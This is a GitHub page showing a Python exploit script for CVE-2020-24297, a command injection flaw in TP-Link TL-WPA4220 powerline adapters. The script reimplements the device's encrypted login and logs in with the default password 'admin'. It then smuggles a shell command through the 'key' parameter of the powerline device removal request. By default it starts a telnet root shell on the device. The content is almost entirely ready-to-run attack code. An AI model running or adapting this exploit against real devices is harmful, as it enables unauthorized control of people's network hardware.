  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Focastejon%2Fexploits%2Fblob%2Fmain%2Fcve-2020-24297%2Ftplink-wpa4220-rce-exploit.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=ocastejon%2Fexploits)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ocastejon](/ocastejon)
/
**[exploits](/ocastejon/exploits)**
Public

* [Notifications](/login?return_to=%2Focastejon%2Fexploits) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Focastejon%2Fexploits)
* [Star
   3](/login?return_to=%2Focastejon%2Fexploits)

* [Code](/ocastejon/exploits)
* [Issues
  0](/ocastejon/exploits/issues)
* [Pull requests
  0](/ocastejon/exploits/pulls)
* [Actions](/ocastejon/exploits/actions)
* [Projects
  0](/ocastejon/exploits/projects)
* [Security](/ocastejon/exploits/security)
* [Insights](/ocastejon/exploits/pulse)

Additional navigation options

* [Code](/ocastejon/exploits)
* [Issues](/ocastejon/exploits/issues)
* [Pull requests](/ocastejon/exploits/pulls)
* [Actions](/ocastejon/exploits/actions)
* [Projects](/ocastejon/exploits/projects)
* [Security](/ocastejon/exploits/security)
* [Insights](/ocastejon/exploits/pulse)

## Files

 main
## Breadcrumbs

1. [exploits](/ocastejon/exploits/tree/main)
2. /[cve-2020-24297](/ocastejon/exploits/tree/main/cve-2020-24297)
/
# tplink-wpa4220-rce-exploit.py

Copy path Blame  Blame
## Latest commit

## History

[History](/ocastejon/exploits/commits/main/cve-2020-24297/tplink-wpa4220-rce-exploit.py)143 lines (120 loc) · 5.31 KB main
## Breadcrumbs

1. [exploits](/ocastejon/exploits/tree/main)
2. /[cve-2020-24297](/ocastejon/exploits/tree/main/cve-2020-24297)
/
# tplink-wpa4220-rce-exploit.py

Top
## File metadata and controls

* Code
* Blame

143 lines (120 loc) · 5.31 KB[Raw](https://github.com/ocastejon/exploits/raw/refs/heads/main/cve-2020-24297/tplink-wpa4220-rce-exploit.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143#!/bin/env python3
# Exploit Title: TP-Link WPA4220 Command Injection# Date: 2020-11-17# Exploit Author: Oriol Castejon @foolisses# Vendor Homepage: https://www.tp-link.com# Software Link: https://www.tp-link.com/en/support/download/tl-wpa4220/v4/#Firmware# Version: TL-WPA4220(EU)\_V4\_190326# CVE : CVE-2020-24297
import argparseimport base64import hashlibimport jsonimport requestsfrom Crypto.Cipher import AES
# These parameters are set by the browser, so we can decide their valuekey = b'1595026205026583'iv = b'1595026205026193'
def rsa\_encrypt(plaintext): encrypted = '' for i in range(len(plaintext) // 64 + 1): block = plaintext[i \* 64:(i + 1) \* 64] encoded = [format(ord(c), 'x') for c in block] + ['00'] \* (64 - len(block)) encoded = int("".join(encoded), 16) encrypted\_block = pow(encoded, e, n) encrypted += format(encrypted\_block, 'x') if len(encrypted) % 2 == 1: encrypted = '0' + encrypted return encrypted
def aes\_encrypt(plaintext): padded = pad(plaintext) cipher = AES.new(key, AES.MODE\_CBC, iv) encrypted = cipher.encrypt(padded.encode()) return base64.b64encode(encrypted).decode('utf-8')
def aes\_decrypt(encrypted): cipher = AES.new(key, AES.MODE\_CBC, iv) plaintext = cipher.decrypt(base64.b64decode(encrypted)) return plaintext[:-ord(plaintext[len(plaintext) - 1:])].decode('utf-8')
def pad(plaintext): pad = AES.block\_size - len(plaintext) % AES.block\_size return plaintext + pad \* chr(pad)
def get\_rsa\_pubkey\_seq(target): r = requests.post("http://{}/login?form=auth".format(target), data={"operation": "read"}) r = r.json() if not r.get("success"): print("[!] Something went wrong, couldn't retrieve RSA public key") return False, False, False n = int(r["data"]["key"][0], 16) e = int(r["data"]["key"][1], 16) seq = int(r["data"]["seq"]) return n, e, seq
def send\_encrypted\_request(target, path, plaintext\_data, password, is\_login=False): url = "http://{}{}".format(target, path) encrypted\_data = aes\_encrypt(plaintext\_data) m = hashlib.md5() m.update(password.encode('utf-8')) password\_hash = m.hexdigest() if is\_login: sign = rsa\_encrypt("k={}&i={}&h={}&s={}".format(key.decode('utf-8'), iv.decode('utf-8'), password\_hash, seq + len(encrypted\_data))) else: sign = rsa\_encrypt("h={}&s={}".format(password\_hash, seq + len(encrypted\_data))) data = { "sign": sign, "data": encrypted\_data }
 headers = { "Host": target, "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "application/json, text/javascript, \*/\*; q=0.01", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://{}".format(target), "Connection": "close", "Referer": "http://{}/".format(target), "Cookie": "Authorization=" }
 r = requests.post(url, data=data, headers=headers) try: encrypted\_data = r.json().get("data") response = aes\_decrypt(encrypted\_data) if is\_login and not json.loads(response).get("success"): return False except Exception as ex: print("There was some error, could not decrypt response. Error: {}".format(ex)) return False return True
def login(target, password): print("[+] Logging in with password: {}".format(password)) if send\_encrypted\_request(target, "/login?form=login", "operation=login&password={}".format(rsa\_encrypt(password)), password, True): print("[+] Login executed successfully") else: print("[!] Login failed!") return False return True
def exploit(target, password, cmd): print("[+] Sending exploit. This will take a some seconds, please be patient!") if send\_encrypted\_request(target, "/admin/powerline?form=plc\_device", "operation=remove&key=1234; {} #".format(cmd), password): print("[+] Exploit executed successfully") if cmd == "telnetd -l /bin/sh": print("[+] Now you can connect to the device with the following command:\n telnet {}".format(target)) else: print("[!] Failed to execute exploit")
if \_\_name\_\_ == '\_\_main\_\_': parser = argparse.ArgumentParser(description='RCE exploit for the TL-WPA4220') parser.add\_argument('target', type=str, metavar='target', help='IP of the TL-WPA4220 device') parser.add\_argument('-p', '--password', type=str, metavar='password', help='Password of the TL-WPA4220 Web interface (default: admin)', default='admin') parser.add\_argument('-c', '--cmd', type=str, metavar='command', help='Command to execute in the device (if not specified, it will start the telnet service)', default='telnetd -l /bin/sh') args = parser.parse\_args() print("[+] Getting RSA public key of the device") n, e, seq = get\_rsa\_pubkey\_seq(args.target) if n and e and seq: print("[+] RSA public key correctly obtained") if login(args.target, args.password): exploit(args.target, args.password, args.cmd)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


